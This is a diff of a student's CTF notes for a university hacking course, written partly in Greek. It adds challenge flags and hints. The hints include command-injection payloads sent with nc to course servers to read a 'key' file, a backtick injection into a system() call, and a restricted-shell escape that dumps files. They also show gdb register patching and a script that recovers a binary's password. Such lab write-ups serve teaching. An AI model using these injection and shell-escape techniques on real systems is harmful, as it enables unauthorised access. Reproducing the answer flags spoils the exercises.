@@ -33,17 +33,16 @@ solution: 81207634a1e560c5697ddb8775f73880
 hint: nc shell.hackintro25.di.uoa.gr 16139
         `ls`           sprintf(cmd, "echo %s", msg);
                        system(cmd);
-        `cat key`      backtricks σε bash 
+        `cat key`      backticks σε bash 
 -----------------------------------------------------------------------------------------------
-challenge # Byte Code
+challenge #Byte Code
 solution: 2310350a51eea9bd
-hint: scp ~/hw1-26-Dimitriskaragiannis36/login.pyc dimitriskaragiannis36@shell.hackintro25.di.uoa.gr:~/
-        610d = Python 3.9
+hint:   610d = Python 3.9
         https://pylingual.io/ για Decompilation 
         https://www.programiz.com/python-programming/online-compiler/
         e06c42c125f01043d1bcf8c1c2b0bf3f
 -----------------------------------------------------------------------------------------------
-challenge # injection 2
+challenge #injection 2
 solution: 9c26c16a8498f40d771905ab05b6ad5e
 hint: printf '|ls\t-la\n' | nc shell.hackintro25.di.uoa.gr 14126
       printf '|cat\tkey\n' | nc shell.hackintro25.di.uoa.gr 14126 ή
@@ -53,4 +52,43 @@ hint: printf '|ls\t-la\n' | nc shell.hackintro25.di.uoa.gr 14126
                         δεν φιλτράρει tab (\t) και Ο server νομίζει ότι τρέχει echo [κείμενο] 
                         αλλά επειδή το input αρχίζει με |, το shell το διαβάζει ως δύο εντολές 
                         και όχι ως argument του echo
+-----------------------------------------------------------------------------------------------
+challenge #prettycsv
+solution: 1e5a71a8078aa45e3292a2ec66555dc6
+hint:  nc shell.hackintro25.di.uoa.gr 52682
+        n                          ελέγχω IFS
+        p                          σπάω /usr/bin/expr → /usr/bin/ex
+        1 + enter (25 φορές)              if [ $counter -gt 24 ]; then
+                                                break
+                                          fi  (counter > 24)
+        !cat * 1>&2               διαβάζει όλα τα αρχεία → στέλνει output στο stderr
+-----------------------------------------------------------------------------------------------
+challenge #yoda
+solution: 02971534236026254751205521877877
+hint:   cd /problems/e8f15a3c85274c05e4feaba87e90157e
+        objdump -d yoda
+        gdb ./yoda
+        b *0x804815e
+        run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (32)
+        set {char}(%ebx) = $cl για να περάσει η σύγκριση
+        set $eip = 0x8048163  jump στη γραμμή που συνεχίζει η λούπα
+        ή αυτοματοποιημένα:
+        commands 1
+        silent
+        set *(char*)$ebx = $ecx
+        set $eip = 0x8048163
+        continue
+        end
+
+        χρήση python αρχείου:
+        data = bytes.fromhex("30 02 07 fe fa 04 fe 01 fe 01 03 fa 02 04 fc 03 ff 03 fe fc 01 fe 05 00 fd ff 07 ff 00 01 ff 00")
+
+        target = 0
+        password = ""
+
+        for b in data:
+        target = (target + b) & 0xff
+        password += chr(target)
+
+        print(password)
 -----------------------------------------------------------------------------------------------
